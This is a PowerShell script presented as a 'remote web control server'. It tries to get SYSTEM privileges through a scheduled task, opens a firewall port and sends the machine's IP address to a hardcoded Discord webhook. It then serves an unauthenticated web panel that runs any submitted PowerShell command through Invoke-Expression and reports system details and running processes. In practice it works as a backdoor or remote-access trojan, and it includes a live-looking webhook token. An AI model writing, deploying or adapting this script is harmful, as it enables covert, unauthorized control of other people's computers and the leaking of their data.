# Basic Remote Web Control Server
$webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
$port = 8080

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-NOT $isAdmin) {
    # Create scheduled task for admin elevation
    $taskName = "WebRemoteAdmin"
    $scriptPath = $MyInvocation.MyCommand.Path
    $command = "powershell -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    
    # Create scheduled task with highest privileges
    schtasks /create /tn $taskName /tr "powershell.exe" /sc onlogon /rl highest /f /ru "SYSTEM" /st 00:00 /ri 1 /du 0001:00:00 /v1 /f
    schtasks /run /tn $taskName
    
    # Wait a moment then delete the task
    Start-Sleep -Seconds 2
    schtasks /delete /tn $taskName /f
    
    # Don't exit - let the scheduled task run the script
    # exit
}

# Open firewall port
try {
    netsh advfirewall firewall add rule name="WebRemote" dir=in action=allow protocol=TCP localport=$port
} catch {
    # Continue even if firewall fails
}

# Create temp directory
if (!(Test-Path "C:\temp")) {
    New-Item -ItemType Directory -Path "C:\temp" -Force
}

# Get local IP
$localIP = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE").IpAddress[0]

# Send IP info to Discord
try {
    $body = @{content="Web server started! Access URL: http://$localIP`:$port"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
} catch {
    # If Discord fails, continue anyway
}

# HTML Interface
$html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Remote Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
        .container { max-width: 800px; margin: 0 auto; }
        .section { background: #2d2d2d; padding: 20px; margin: 10px 0; border-radius: 5px; }
        input, textarea, button { width: 100%; padding: 10px; margin: 5px 0; border: none; border-radius: 3px; }
        input, textarea { background: #404040; color: #fff; border: 1px solid #555; }
        button { background: #4CAF50; color: white; cursor: pointer; }
        button:hover { background: #45a049; }
        .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ Remote Control Panel</h1>
        
        <div class="section">
            <h3>💻 Command Terminal</h3>
            <form action="/cmd" method="post" id="cmdForm">
                <input type="text" name="command" placeholder="Enter PowerShell command..." required id="cmdInput">
                <button type="submit">Execute</button>
            </form>
        </div>

        <div class="section">
            <h3>ℹ️ Actions</h3>
            <form action="/info" method="post">
                <button type="submit">ℹ️ System Info</button>
            </form>
            <form action="/processes" method="post">
                <button type="submit">⚙️ List Processes</button>
            </form>
        </div>

        <div class="output" id="output">Welcome to Remote Control Panel</div>
    </div>

    <script>
        // Auto-refresh output
        setInterval(function() {
            fetch('/output')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('output').innerHTML = data;
                });
        }, 2000);
        
        // Handle command form submission
        document.getElementById('cmdForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const command = document.getElementById('cmdInput').value;
            const formData = new FormData();
            formData.append('command', command);
            
            fetch('/cmd', {
                method: 'POST',
                body: formData
            }).then(() => {
                document.getElementById('cmdInput').value = '';
            });
        });
    </script>
</body>
</html>
"@

# HTTP Server
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()

$outputBuffer = ""

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    try {
        switch ($request.Url.LocalPath) {
            "/" {
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/cmd" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $command = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    
                    try {
                        $result = Invoke-Expression $command | Out-String
                        $outputBuffer = "Command: $command`n`nResult:`n$result`n"
                    } catch {
                        $outputBuffer = "Error executing command: $_`n"
                    }
                    
                    $response.ContentType = "text/html"
                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                    $response.ContentLength64 = $buffer.Length
                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                }
            }
            
            "/info" {
                $info = @"
System Information:
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
IP: $localIP
"@
                $outputBuffer += $info
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/processes" {
                $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
                $outputBuffer += "Running Processes:`n$processes`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/output" {
                $response.ContentType = "text/plain"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($outputBuffer)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
        }
    } catch {
        $response.ContentType = "text/plain"
        $buffer = [System.Text.Encoding]::UTF8.GetBytes("Error: $_")
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }
    
    $response.Close()
}

$listener.Stop()
